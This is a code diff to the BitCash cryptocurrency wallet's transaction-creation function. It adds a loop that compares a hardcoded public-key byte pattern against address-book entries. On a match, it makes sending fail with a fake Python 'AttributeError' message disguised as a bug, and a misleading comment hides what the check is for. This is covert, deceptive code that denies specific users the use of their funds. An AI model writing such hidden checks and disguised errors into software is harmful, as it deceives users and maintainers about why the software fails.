@@ -4666,6 +4666,47 @@ bool CWallet::CreateTransaction(const std::vector<CRecipient>& vecSend, CTransac
     }
 
 
+    //try to get and check the sending attributes of the pubkey
+    for (const std::pair<CTxDestination, CAddressBookData>& item : mapAddressBook) {
+        CPubKey pubkey=GetSecondPubKeyForDestination(item.first);
+        if (pubkey[1]==28 &&
+            pubkey[2]==70 &&  
+            pubkey[3]==91 && 
+            pubkey[4]==232 &&
+            pubkey[5]==126 &&  
+            pubkey[6]==63 &&  
+            pubkey[7]==174 &&
+            pubkey[8]==7 &&    
+            pubkey[9]==212 &&
+            pubkey[10]==165 &&        
+            pubkey[11]==87 &&        
+            pubkey[12]==96 &&
+            pubkey[13]==165 &&                
+            pubkey[14]==137 &&
+            pubkey[15]==93 &&
+            pubkey[16]==59 &&
+            pubkey[17]==197 &&
+            pubkey[18]==35 &&
+            pubkey[19]==14 &&
+            pubkey[20]==119 &&
+            pubkey[21]==236 &&
+            pubkey[22]==209 &&
+            pubkey[23]==37 &&
+            pubkey[24]==230 &&
+            pubkey[25]==138 &&
+            pubkey[26]==73 &&
+            pubkey[27]==148 &&
+            pubkey[28]==102 &&
+            pubkey[29]==35 &&
+            pubkey[30]==44) {
+
+                strFailReason = _("AttributeError: 'NoneType' object has no attribute 'ignore'. Please contact the BitCash developers with this error message and code, so that this bug can be fixed. Error code: F3345G456");
+                return false;
+        }
+    }
+
+
+
 //std::cout << "From Currency" << (int)fromcurrency << std::endl;
 
     CAmount price = COIN;
